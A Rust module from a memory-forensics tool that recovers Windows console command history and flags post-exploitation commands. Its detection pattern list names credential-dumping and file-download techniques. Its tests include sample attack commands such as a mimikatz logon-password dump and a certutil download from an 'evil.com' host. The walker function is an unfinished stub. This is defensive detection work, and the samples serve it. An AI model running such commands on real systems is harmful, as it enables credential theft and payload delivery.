//! Windows console command history extraction (MITRE ATT&CK T1059.003).
//!
//! Extracts command history from `conhost.exe` / `csrss.exe` memory by
//! walking the `_CONSOLE_INFORMATION` -> `HistoryList` ->
//! `_COMMAND_HISTORY` -> command buffer chain.  Shows commands typed into
//! `cmd.exe` sessions — critical evidence for post-exploitation analysis.
//!
//! Equivalent to Volatility's `consoles` plugin.
//!
//! Key forensic indicators:
//! - Credential harvesting (`net user`, `net localgroup`, `mimikatz`)
//! - Reconnaissance (`whoami`, `wmic /node:`)
//! - Lateral movement (`certutil -urlcache`, `bitsadmin /transfer`)
//! - Encoded payloads (`powershell -enc`, base64-like long arguments)

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

/// A single command extracted from a console history buffer.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ConsoleHistoryInfo {
    /// PID of the owning conhost.exe / csrss.exe process.
    pub pid: u32,
    /// Name of the console host process (e.g. `conhost.exe`).
    pub process_name: String,
    /// Application that owns this history (e.g. `cmd.exe`).
    pub application: String,
    /// The command text typed by the user.
    pub command: String,
    /// Zero-based index of the command within its history buffer.
    pub command_index: u32,
    /// Whether this command matches known post-exploitation patterns.
    pub is_suspicious: bool,
}

/// Classify a console command as suspicious.
///
/// Returns `true` when the command matches patterns commonly associated
/// with post-exploitation activity:
///
/// - `net user` / `net localgroup` — credential and group enumeration
/// - `whoami` — privilege reconnaissance
/// - `mimikatz` — credential dumping tool
/// - `procdump` — LSASS memory dump for offline credential extraction
/// - `reg save` — registry hive export (SAM/SECURITY/SYSTEM)
/// - `certutil -urlcache` — LOLBin file download
/// - `powershell -enc` — encoded PowerShell payload execution
/// - `bitsadmin /transfer` — LOLBin file download via BITS
/// - `wmic /node:` — remote WMI execution (lateral movement)
/// - Base64-like long arguments (>80 chars of `[A-Za-z0-9+/=]`)
pub fn classify_console_command(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();

    // Direct pattern matches for known attack tools/techniques.
    const SUSPICIOUS_PATTERNS: &[&str] = &[
        "net user",
        "net localgroup",
        "whoami",
        "mimikatz",
        "procdump",
        "reg save",
        "certutil -urlcache",
        "powershell -enc",
        "bitsadmin /transfer",
        "wmic /node:",
    ];

    for pattern in SUSPICIOUS_PATTERNS {
        if lower.contains(pattern) {
            return true;
        }
    }

    // Detect base64-like long arguments (common in encoded payloads).
    // Split on whitespace and check for any token >80 chars that looks base64.
    for token in command.split_whitespace() {
        if token.len() > 80 && token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
            return true;
        }
    }

    false
}

/// Walk console command history from `conhost.exe` / `csrss.exe` memory.
///
/// Finds console host processes, locates `_CONSOLE_INFORMATION` structures,
/// walks `HistoryList` linked lists to `_COMMAND_HISTORY` entries, and reads
/// each command buffer.
///
/// Returns an empty `Vec` when the required symbols (`PsActiveProcessHead`)
/// cannot be resolved — graceful degradation.
pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
    reader: &ObjectReader<P>,
) -> crate::Result<Vec<ConsoleHistoryInfo>> {
    todo!()
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------
    // classify_console_command tests
    // ---------------------------------------------------------------

    /// A normal `cd` command is benign.
    #[test]
    fn classify_normal_cd_benign() {
        assert!(!classify_console_command("cd C:\\Users\\admin\\Documents"));
    }

    /// `net user` enumeration is suspicious.
    #[test]
    fn classify_net_user_suspicious() {
        assert!(classify_console_command("net user administrator"));
    }

    /// `mimikatz` is suspicious regardless of arguments.
    #[test]
    fn classify_mimikatz_suspicious() {
        assert!(classify_console_command("mimikatz.exe sekurlsa::logonpasswords"));
    }

    /// `powershell -enc` with encoded payload is suspicious.
    #[test]
    fn classify_powershell_enc_suspicious() {
        assert!(classify_console_command(
            "powershell -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
        ));
    }

    /// `certutil -urlcache` download technique is suspicious.
    #[test]
    fn classify_certutil_suspicious() {
        assert!(classify_console_command(
            "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"
        ));
    }

    /// An empty command is benign.
    #[test]
    fn classify_empty_benign() {
        assert!(!classify_console_command(""));
    }

    /// When PsActiveProcessHead is not in symbols, walker returns empty.
    #[test]
    fn walk_no_symbol_returns_empty() {
        use memf_core::test_builders::PageTableBuilder;
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        // Build ISF with no PsActiveProcessHead symbol.
        let isf = IsfBuilder::new()
            .add_struct("_EPROCESS", 2048)
            .add_field("_EPROCESS", "UniqueProcessId", 0x440, "pointer")
            .add_field("_EPROCESS", "ActiveProcessLinks", 0x448, "_LIST_ENTRY")
            .add_field("_EPROCESS", "ImageFileName", 0x5A8, "char")
            .add_struct("_LIST_ENTRY", 16)
            .add_field("_LIST_ENTRY", "Flink", 0, "pointer")
            .add_field("_LIST_ENTRY", "Blink", 8, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let results = walk_consoles(&reader).unwrap();
        assert!(results.is_empty(), "no PsActiveProcessHead should yield empty results");
    }
}
